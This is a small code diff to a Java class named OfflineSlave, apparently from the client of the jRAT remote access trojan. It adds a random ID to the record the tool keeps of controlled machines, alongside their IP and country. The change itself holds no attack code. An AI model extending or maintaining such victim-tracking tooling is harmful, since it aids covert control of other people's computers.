@@ -1,5 +1,7 @@
 package se.jrat.client;
 
+import java.util.Random;
+
 
 public class OfflineSlave {
 
@@ -10,6 +12,7 @@ public class OfflineSlave {
 	protected String ip;
 	protected String country;
 	protected long creation = System.currentTimeMillis();
+	protected long randomId = getRandomId();
 	
 	public OfflineSlave(AbstractSlave slave) {
 		this.userstring = slave.formatUserString();
@@ -47,7 +50,8 @@ public class OfflineSlave {
 		sb.append(slave.version + ":");
 		sb.append(slave.ip + ":");
 		sb.append(slave.country + ":");
-		sb.append(slave.creation);
+		sb.append(slave.creation + ":");
+		sb.append(slave.randomId);
 		
 		return sb.toString();
 	}
@@ -70,6 +74,11 @@ public class OfflineSlave {
 	
 	public long getCreation() {
 		return creation;
+	}
+	
+	public static long getRandomId() {
+		int i = -new Random().nextInt(Integer.MAX_VALUE);
+		return i;
 	}
 	
 	@Override
